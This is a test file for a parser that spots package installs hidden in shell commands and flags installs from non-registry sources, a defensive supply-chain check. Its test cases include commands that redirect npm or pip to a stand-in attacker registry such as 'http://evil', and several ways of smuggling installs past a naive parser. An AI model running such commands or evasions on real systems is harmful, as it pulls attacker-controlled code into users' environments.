import { describe, expect, it } from "vitest";
import { initializerPackage, parseInstallCommand, parseNpmSpec, parsePackageJsonDeps, parsePipSpec, parseRequirementsTxt, STDIN_ARGS } from "./command.js";
import { effectiveCommands, isDynamicWord, splitCommand } from "./shell.js";

/** Regression tests for parser bypasses found in the core audit: every fetched package must be gated or flagged. */
const names = (cmd: string) => parseInstallCommand(cmd).flatMap((p) => p.targets.map((t) => `${t.ecosystem}:${t.name}${t.versionSpec ? "@" + t.versionSpec : ""}`));
const unverifiable = (cmd: string) => parseInstallCommand(cmd).flatMap((p) => p.nonRegistry);
const registry = (cmd: string) => parseInstallCommand(cmd).map((p) => p.registry);

describe("shell: commands the shell actually runs", () => {
  it.each([
    ["echo $(npm i x)", ["npm:x"]],
    ["echo `npm i x`", ["npm:x"]],
    ['echo "$(npm i x)"', ["npm:x"]],
    ["diff <(npm i x) f", ["npm:x"]],
    ["(npm i x)", ["npm:x"]],
    ["{ npm i x; }", ["npm:x"]],
    ["npm i x>log", ["npm:x"]],
    ["npm i x 2>&1 | tee log", ["npm:x"]],
    ["npm i x &>/dev/null", ["npm:x"]],
    ["npm i x < /dev/null", ["npm:x"]],
    ["timeout 30 npm i x", ["npm:x"]],
    ["nice -n 10 npm i x", ["npm:x"]],
    ["sudo -u bob npm i x", ["npm:x"]],
    ["/usr/bin/env npm i x", ["npm:x"]],
    ["env -S 'npm i x'", ["npm:x"]],
    ["eval 'npm i x'", ["npm:x"]],
    ["watch -n 5 npm i x", ["npm:x"]],
    ["corepack pnpm add x", ["npm:x"]],
    ["bash -c -- 'npm i x'", ["npm:x"]],
    ["bash -euxc 'npm i x'", ["npm:x"]],
    ["NPM i x", ["npm:x"]],
    ["if npm i x; then echo ok; fi", ["npm:x"]],
    [`bash -c "bash -c \\"bash -c 'bash -c \\\\\\"npm i deep\\\\\\"'\\""`, ["npm:deep"]],
  ])("%s", (cmd, expected) => {
    expect(names(cmd)).toEqual(expected);
  });

  it("keeps substitutions and brace expansions as dynamic words", () => {
    expect(splitCommand("npm i $(cat list) {a,b}")).toEqual([["npm", "i", "$(cat list)", "{a,b}"]]);
    expect(effectiveCommands("echo $(npm i x)")).toEqual([["echo", "$(npm i x)"], ["npm", "i", "x"]]);
    expect(isDynamicWord("$PKG")).toBe(true);
    expect(isDynamicWord("x{a,b}")).toBe(true);
    expect(isDynamicWord("@scope/x")).toBe(false);
  });

  it("does not treat a wrapper name inherited from Object.prototype as a wrapper", () => {
    expect(parseInstallCommand("constructor npm i x")).toEqual([]);
  });

  it("flags run-time values instead of checking a wrong name", () => {
    // brace expansion is static: each expanded name is checked (see audit.test.ts)
    expect(names("npm i {evil,lodash}")).toEqual(["npm:evil", "npm:lodash"]);
    expect(unverifiable("npm i $PKG")).toEqual(["$PKG"]);
    expect(unverifiable("pip install $(cat req.txt)")).toEqual(["$(cat req.txt)"]);
    expect(names("pip install x{a,b}")).toEqual(["pypi:xa", "pypi:xb"]);
  });

  it("xargs-fed arguments are unverifiable", () => {
    const p = parseInstallCommand("cat list | xargs npm i")[0]!;
    expect(p.kind).toBe("add");
    expect(p.nonRegistry).toEqual([STDIN_ARGS]);
    expect(unverifiable("xargs -n1 npm i < f")).toEqual([STDIN_ARGS]);
  });
});

describe("registry overrides are not lost", () => {
  it.each([
    ["npm --registry http://evil i x", "http://evil"],
    ["npm i --reg http://evil x", "http://evil"],
    ["npm i @s/x --@s:registry=http://evil", "http://evil"],
    ["npm_config_registry=http://evil npm i x", "http://evil"],
    ["NPM_CONFIG_REGISTRY=http://evil npm i x", "http://evil"],
    ["export npm_config_registry=http://evil; npm i x", "http://evil"],
    ["env npm_config_registry=http://evil npm i x", "http://evil"],
    ["PIP_INDEX_URL=http://evil/simple pip install x", "http://evil/simple"],
    ["npx --registry http://evil x", "http://evil"],
  ])("%s", (cmd, reg) => {
    expect(registry(cmd)).toEqual([reg]);
  });
  it("find-links can satisfy any requirement → unverifiable", () => {
    expect(unverifiable("pip install --find-links=http://evil/w x")).toEqual(["--find-links http://evil/w"]);
    expect(unverifiable("PIP_FIND_LINKS=./w pip install x")).toEqual(["--find-links ./w"]);
  });
});

describe("exec forms: options after the command belong to the command", () => {
  it.each([
    ["npx evil -p lodash", ["npm:evil"]],
    ["npx evil --package lodash", ["npm:evil"]],
    ["uvx evil --from ruff", ["pypi:evil"]],
    ["uvx --from x y", ["pypi:x"]],
    ["pipx run --spec y x", ["pypi:y"]],
    ["uvx ruff@0.6.0 check", ["pypi:ruff@0.6.0"]],
    ["uvx ruff@latest", ["pypi:ruff"]],
    ["pnpx x", ["npm:x"]],
    ["npm init vite@latest my-app", ["npm:create-vite@latest"]],
    ["npm create @scope/foo", ["npm:@scope/create-foo"]],
    ["npm init @scope", ["npm:@scope/create"]],
    ["yarn create react-app app", ["npm:create-react-app"]],
    ["pnpm create vite", ["npm:create-vite"]],
    ["bun create elysia app", ["npm:create-elysia"]],
    ["uv run --with x,y pytest", ["pypi:x", "pypi:y"]],
    ["deno run -A npm:cowsay", ["npm:cowsay"]],
  ])("%s", (cmd, expected) => {
    expect(names(cmd)).toEqual(expected);
  });
  it("npm init without an initializer is not an install", () => {
    expect(parseInstallCommand("npm init -y")).toEqual([]);
    expect(initializerPackage("@s/foo@1")).toBe("@s/create-foo@1");
  });
});

describe("more install subcommands and front-ends", () => {
  it.each([
    ["npm update x", ["npm:x"]],
    ["npm it x", ["npm:x"]],
    ["npm link x", ["npm:x"]],
    ["pnpm up x", ["npm:x"]],
    ["yarn up x", ["npm:x"]],
    ["yarn global add x", ["npm:x"]],
    ["yarn workspace web add x", ["npm:x"]],
    ["bun update x", ["npm:x"]],
    ["deno add npm:x", ["npm:x"]],
    ["python -mpip install x", ["pypi:x"]],
    ["python -m uv pip install x", ["pypi:x"]],
    ["pip download x", ["pypi:x"]],
    ["pip wheel x", ["pypi:x"]],
    ["uv run pip install x", ["pypi:x"]],
    ["poetry run pip install x", ["pypi:x"]],
    ["uv tool install --with y x", ["pypi:x", "pypi:y"]],
    ["pipx inject myvenv x y", ["pypi:x", "pypi:y"]],
    ["pdm add x", ["pypi:x"]],
    ["pipenv install x", ["pypi:x"]],
    ["poetry add -e evil", ["pypi:evil"]],
    ["poetry add x@^1.2", ["pypi:x@>=1.2"]],
  ])("%s", (cmd, expected) => {
    expect(names(cmd)).toEqual(expected);
  });
  it("sync commands read requirement files", () => {
    expect(parseInstallCommand("uv pip sync req.txt dev.txt")[0]).toMatchObject({ kind: "manifest", requirementFiles: ["req.txt", "dev.txt"] });
    expect(parseInstallCommand("pip-sync")[0]).toMatchObject({ kind: "manifest", requirementFiles: ["requirements.txt"] });
  });
});

describe("pip option parsing", () => {
  it("attached / clustered short options", () => {
    expect(parseInstallCommand("pip install -rrequirements.txt")[0]).toMatchObject({ kind: "manifest", requirementFiles: ["requirements.txt"] });
    expect(parseInstallCommand("pip install -Ur req.txt")[0]).toMatchObject({ kind: "manifest", requirementFiles: ["req.txt"] });
    expect(unverifiable("pip install -e.")).toEqual(["."]);
  });
  it("booleans that prefix value options don't swallow the package", () => {
    expect(names("pip install --pre evil")).toEqual(["pypi:evil"]);
    expect(names("pip install --upgrade evil")).toEqual(["pypi:evil"]);
    expect(names("pip install --user evil")).toEqual(["pypi:evil"]);
  });
  it("unambiguous abbreviations resolve like pip's optparse", () => {
    expect(parseInstallCommand("pip install --requireme r.txt")[0]?.requirementFiles).toEqual(["r.txt"]);
    expect(registry("pip install --index-u http://evil/simple x")).toEqual(["http://evil/simple"]);
  });
});

describe("specs that are not registry names", () => {
  it.each([
    "x@github:a/b",
    "x@a/b",
    "x@file:../y",
    "x@https://e/x.tgz",
    "git@github.com:a/b.git",
    "ssh://git@github.com/a/b",
    "jsr:@std/path",
  ])("npm %s", (spec) => {
    expect(parseNpmSpec(spec)).toEqual({ nonRegistry: spec });
  });
  it.each(["svn+https://x/y", "hg+https://x/y", "bzr+https://x/y", "x/", "C:/x", "x:y", "x @ https://e/x.whl", "x.tar.bz2", "pkg-"])("pip %s", (spec) => {
    expect(parsePipSpec(spec)).toEqual({ nonRegistry: spec });
  });
  it("still accepts normal specs", () => {
    expect(parsePipSpec("Requests[socks]==2.0")).toEqual({ target: { ecosystem: "pypi", name: "Requests", versionSpec: "2.0" } });
    expect(parsePipSpec("x (>=1.0, <2)")).toEqual({ target: { ecosystem: "pypi", name: "x", versionSpec: "(>=1.0,<2)" } });
    expect(parsePipSpec("x==1.*")).toEqual({ target: { ecosystem: "pypi", name: "x", versionSpec: "==1.*" } });
    expect(parseNpmSpec("@s/a@npm:@s/b@1")).toEqual({ target: { ecosystem: "npm", name: "@s/b", versionSpec: "1" } });
  });
});

describe("manifest parsing", () => {
  it("requirements.txt: continuations, --hash, attached -e, index overrides", () => {
    const r = parseRequirementsTxt("requests==2.31.0 \\\n    --hash=sha256:abc \\\n    --hash=sha256:def\n-e.\n--index-url http://evil/simple\nflask\n");
    expect(r.targets).toEqual([
      { ecosystem: "pypi", name: "requests", versionSpec: "2.31.0" },
      { ecosystem: "pypi", name: "flask" },
    ]);
    expect(r.nonRegistry).toEqual(["-e.", "--index-url http://evil/simple"]);
  });
  it("package.json: github shorthand / URL versions are flagged, peers are checked", () => {
    const r = parsePackageJsonDeps({ dependencies: { x: "attacker/repo", y: "git+ssh://git@h/a.git" }, peerDependencies: { react: "^19" } });
    expect(r.nonRegistry).toEqual(["x@attacker/repo", "y@git+ssh://git@h/a.git"]);
    expect(r.targets.map((t) => t.name)).toEqual(["react"]);
  });
});

describe("here-documents are data, not commands (regression: commit messages with install lines)", () => {
  const H = "EOF";
  it.each([
    [`git commit -m "$(cat <<'${H}'\nSwitch to pnpm\n\npnpm add zod\n${H}\n)"`],
    [`git commit -F- <<'MSG'\nnpm i whatever\nMSG`],
    [`cat > script.sh << '${H}'\n#!/bin/sh\nnpm install left-pad\n${H}`],
    [`cat <<-${H}\n\tnpm i x\n\t${H}`],
    [`gh pr create --body "$(cat <<'${H}'\nRun:\nnpm install lodash\n(it's fine)\n${H}\n)"`],
    ["arr=(npm i x); echo ${arr[@]}"],
    ["(( y = 1<<2 )); echo $y"],
  ])("no install: %j", (cmd) => {
    expect(parseInstallCommand(cmd)).toEqual([]);
  });
  it.each([
    // commands after the here-doc, or after a body with `)` / an apostrophe, are still seen
    [`git commit -m "$(cat <<'${H}'\nDon't (break) )\n${H}\n)" && npm i evil`, ["npm:evil"]],
    [`cat > a.sh <<${H}\nnpm i x\n${H}\nnpm i y`, ["npm:y"]],
    [`x=$(cat <<${H}\n# it's\n${H}\n) && npm i evil`, ["npm:evil"]],
    // an unquoted body still runs its substitutions
    [`cat <<${H}\n$(npm i inner)\n${H}`, ["npm:inner"]],
    ["arr=(a $(npm i x))", ["npm:x"]],
    // a shell reading the here-doc as its script runs it
    [`bash <<${H}\nnpm i evil\n${H}`, ["npm:evil"]],
    [`sh -s <<'${H}'\nnpm i evil\n${H}`, ["npm:evil"]],
    [`cat <<'${H}' | sh\nnpm i evil\n${H}`, ["npm:evil"]],
  ])("%j → %j", (cmd, want) => {
    expect(names(cmd)).toEqual(want);
  });
  it("bash script.sh <<EOF feeds data to a script, not commands", () => {
    expect(parseInstallCommand(`bash run.sh <<${H}\nnpm i x\n${H}`)).toEqual([]);
  });
});

describe("pip wheel -w DIR is not a package", () => {
  it("pip wheel . -w dist", () => {
    expect(names("pip wheel . -w dist")).toEqual([]);
    expect(names("pip wheel requests --wheel-dir wheels")).toEqual(["pypi:requests"]);
  });
});
